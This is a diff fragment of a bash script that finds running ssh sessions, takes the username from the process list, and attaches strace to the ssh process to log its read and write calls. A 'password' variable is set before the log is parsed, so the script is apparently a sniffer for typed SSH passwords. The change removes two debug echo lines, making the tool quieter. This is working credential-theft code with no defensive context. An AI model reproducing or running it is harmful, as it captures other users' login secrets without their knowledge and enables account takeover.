@@ -11,7 +11,7 @@ fi
 
 #Check log file exists or not
 if [[ -e $file_log  ]]; then
-  echo "File $file_log was created"
+  echo "File $file_log was created in directory"
 else
   touch $file_log
 fi
@@ -24,10 +24,8 @@ do
     pid=$(ps aux | grep -w ssh | grep @ | head -n1 | awk '{print $2}')
 
     if [[ $pid != "" ]]; then
-        echo "$pid"
         #get username from ssh process
         username=$(ps aux | grep ssh | grep @ | awk '{print $12}' | cut -d '@' -f1)
-        echo 'Run Strace'
         password=""
         strace -e trace=read,write -p "$pid" -f -o $file_log_second
         cat $file_log_second | while read line; do
